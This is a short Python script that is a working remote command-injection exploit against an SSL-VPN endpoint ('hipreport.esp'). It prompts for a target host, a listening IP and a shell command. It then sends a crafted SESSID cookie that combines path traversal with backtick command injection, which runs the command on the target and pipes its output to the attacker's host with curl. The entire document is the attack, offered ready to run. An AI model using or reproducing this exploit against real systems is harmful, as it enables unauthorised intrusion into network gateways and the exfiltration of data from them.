import subprocess     

def generate_curl_command(IP, IP_Listening, command):
    shell_command = f'$( {command} )'
    
    curl_command = (
        f"curl -s -X POST 'https://{IP}/ssl-vpn/hipreport.esp' -k "
        f"-H 'Cookie: SESSID=./../../../opt/panlogs/tmp/device_telemetry/hour/aaa`curl${{IFS}}{IP_Listening}?user={shell_command}`'"
    )
    
    return curl_command

IP = input("Input IP/Host Target: ")
IP_Listening = input("Input IP Listening: ")

command = input("Input command shell: ")

curl_command = generate_curl_command(IP, IP_Listening, command)

try:
    subprocess.run(curl_command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    print("Exploit Success")
except subprocess.CalledProcessError:
    print("Error !")
